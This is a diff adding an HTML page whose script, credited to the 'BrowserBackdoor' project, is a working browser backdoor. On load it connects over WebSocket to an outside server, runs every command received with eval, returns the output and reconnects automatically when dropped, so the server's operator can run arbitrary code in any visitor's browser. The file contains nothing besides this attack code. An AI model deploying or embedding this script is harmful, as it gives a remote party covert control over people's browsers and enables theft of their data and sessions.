@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+    /*
+     * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
+     * BrowserBackdoor - https://github.com/IMcPwn/browser-backdoor
+     * See the file 'LICENSE' for copying permission
+     */
+    (function connect() {
+        if ("WebSocket" in window)
+        {
+            // Change to where you're hosting the WebSocket server.
+            var ws = new WebSocket("wss://i.imcpwn.com:8080");
+            ws.onmessage = function(evt)
+            {
+                if (ws.readyState === 1) {
+                    // Send the result of eval'ing the remote message.
+                    ws.send(eval(evt.data));
+                }
+            };
+            ws.onclose = function()
+            {
+                // Reconnect after 5 seconds.
+                setTimeout(connect, 5000);
+            };
+       };
+    })();
+    </script>
+</head>
+<body>
+</body>
+</html>
